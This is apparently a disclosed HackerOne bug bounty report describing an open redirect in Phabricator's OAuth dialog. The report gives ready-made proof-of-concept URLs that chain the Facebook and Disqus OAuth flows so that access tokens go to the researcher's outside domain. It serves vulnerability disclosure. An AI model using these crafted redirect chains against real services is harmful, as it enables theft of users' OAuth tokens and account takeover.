# HackerOne Report: OAuth Stealing Attack (New)
**Report ID:** 3930
**Vulnerability Class:** Open Redirect

## Vulnerability Information & PoC
Hi Evan,

I found a new and more dangerous way to steal phabricator facebooks oauth tokens,codes,

In this case, I exploited the behavior of Phabricator OAuth Dialog,

If you provide a differnet scope in phabricator OAuth Dialog (https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com&response_type=code&client_id=PHID-OASC-oyfqtnanxsukiw5lsnce&scope=ggg) you will be redirected automatically to the attacker site, In this case, I exploited this behavior to exploit the Phabricator Facebook. Disqus OAuth Providers

PoC for Facebook:

https://www.facebook.com/dialog/oauth?client_id=184510521580034&response_type=token&redirect_uri=https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com%26response_type=code%26client_id=PHID-OASC-oyfqtnanxsukiw5lsnce%26scope=ggg

PoC for Disques:

https://disqus.com/api/oauth/2.0/authorize/?client_id=pGsV2eD61zrctO8A9n9QAA41dRASTXxSBFgs4nieqiwviSroKP5UV1wutlHp8d5y&scope=read&redirect_uri=https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com%26response_type=code%26client_id=PHID-OASC-oyfqtnanxsukiw5lsnce%26scope=ggg&response_type=token

ETC...

The user don't need to be login to perform this kind of attack, it works only via one click, no any continue or another intercation, This attack also need to works on other provides in Phabricator via redirect_uri.

PoC Video:

https://drive.google.com/file/d/0B2-5ltUODX1La0Vjc0ZuemMzRTQ/edit?usp=sharing

## Discussion & Remediation Timeline
